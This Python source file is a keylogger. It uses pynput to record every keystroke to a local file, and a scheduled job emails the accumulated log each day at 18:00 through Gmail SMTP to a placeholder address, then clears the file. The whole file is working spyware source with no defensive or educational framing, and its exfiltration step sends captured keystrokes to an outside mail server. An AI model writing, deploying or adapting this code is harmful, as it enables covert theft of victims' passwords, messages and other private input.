from pynput import keyboard
import smtplib
from email.message import EmailMessage
import schedule
import time
import threading

sender_email = "<your.email>@gmail.com"
sender_pass = "<your.email.password>"
recipient_email = "<your.email>@gmail.com"

log_file = "key_log.txt"


def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ") 
            elif key == keyboard.Key.enter:
                f.write("\n") 
            elif key == keyboard.Key.tab:
                f.write("\t") 
            else:
                f.write(f"[{str(key)}]")


def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


def send_email(log_file, sender_email, sender_pass, recipient_email):
    msg = EmailMessage()
    msg['Subject'] = "Daily Keylogger Report"
    msg['From'] = sender_email
    msg['To'] = recipient_email
    
    with open(log_file, "r") as f:
        msg.set_content(f.readlines())    
    
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(sender_email, sender_pass)
        server.send_message(msg)


def daily_report():
    try:
        send_email(log_file, sender_email, sender_pass, recipient_email)
        with open(log_file, "w") as f:
            f.truncate(0)
    except Exception as e:
        print(f"Error sending daily report: {e}")


def schedule_report():
    schedule.every().day.at("18:00").do(daily_report)
    while True:
        schedule.run_pending()
        time.sleep(60)


if __name__ == "__main__":
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()
    schedule_report()
